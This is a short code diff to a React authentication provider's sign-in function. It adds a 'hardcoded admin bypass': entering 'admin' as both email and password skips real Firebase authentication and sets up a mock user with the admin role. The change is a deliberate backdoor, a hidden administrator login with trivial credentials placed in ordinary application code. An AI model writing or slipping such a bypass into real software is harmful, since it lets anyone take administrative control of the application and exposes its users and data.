@@ -75,6 +75,15 @@ export const AuthProvider = ({ children }) => {
   const signIn = async (email, password) => {
     try {
       setError(null)
+
+      // Hardcoded admin bypass
+      if (email === 'admin' && password === 'admin') {
+        const mockUser = { uid: 'hardcoded-admin-id', email: 'admin' };
+        setUser(mockUser);
+        setUserRole('admin');
+        return mockUser;
+      }
+
       const userCredential = await signInWithEmailAndPassword(auth, email, password)
       const currentUser = userCredential.user
 
